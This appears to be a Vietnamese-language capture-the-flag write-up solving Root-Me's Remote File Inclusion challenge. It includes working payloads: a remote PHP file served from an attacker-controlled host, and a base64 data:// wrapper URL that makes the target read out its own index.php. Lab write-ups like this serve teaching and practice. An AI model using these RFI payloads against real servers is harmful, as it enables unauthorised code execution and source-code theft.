<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-fi/fi_chall3" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Remote File Inclusion
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Abbreviated RFI</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Get the PHP source code.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <p>Form URL theo mẫu:</p>
                <blockquote>
                    <p><a href="http://challenge01.root-me.org/web-serveur/ch13/?lang=en" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch13/?lang=en</a></p>
                </blockquote>
                <p>Ta dễ dàng đoán được lang là chỗ để RFI rồi.<br>Nhưng tại sao từ en mà suy ra được ngôn ngữ gì.</p>
                <p>Có lẽ nó chỉ dùng biến này ở đầu và gán thêm chuỗi gì đó phía sau. Hoặc ngược lại.</p>
                <p>Ta thử với: <strong>lang=abc</strong></p>
                <p><strong>Thấy kết quả</strong>: Warning: include(abc_lang.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch13/index.php on line 18 Warning: include(): Failed opening ‘abc_lang.php’ for inclusion (include_path=’.:/usr/share/php’) in /challenge/web-serveur/ch13/index.php on line 18 </p>
                <p>Hoá ra nó cộng thêm <strong>_lang.php</strong> ở cuối hàm.</p>
                <h2 id="Dung-RFI-basic"><a href="#Dung-RFI-basic" class="headerlink" title="Dùng RFI basic"></a>Dùng RFI basic</h2>
                <p>Tức là ta tạo 1 file <strong>abc_lang.php</strong> ở server của chúng ta, xong nhập vào đường URL tới:</p>
                <blockquote>
                    <p><a href="http://yoursite.com/abc" target="_blank" rel="noopener">http://yoursite.com/abc</a>_</p>
                </blockquote>
                <p>Thì nó sẽ thành: </p>
                <blockquote>
                    <p><a href="http://yoursite.com/abc_lang.php" target="_blank" rel="noopener">http://yoursite.com/abc_lang.php</a></p>
                </blockquote>
                <p>Với nội dung là:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$homepage = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h2 id="Dung-wrapper"><a href="#Dung-wrapper" class="headerlink" title="Dùng wrapper"></a>Dùng wrapper</h2>
                <p>Do cho dùng URL nên ta chắc chắn: <strong>allow_url_include = On</strong><br>Lại dùng hàm include, ta nghĩ ngay đến wrapper data:// hoặc input:// để truyền nội dung vào.<br>Ta thử với wapper data://</p>
                <blockquote>
                    <p>data://text/plain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=</p>
                </blockquote>
                <p>Đây là đoạn base64 của source php phía trên.</p>
                <h3 id="Success"><a href="#Success" class="headerlink" title="Success!"></a>Success!</h3>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>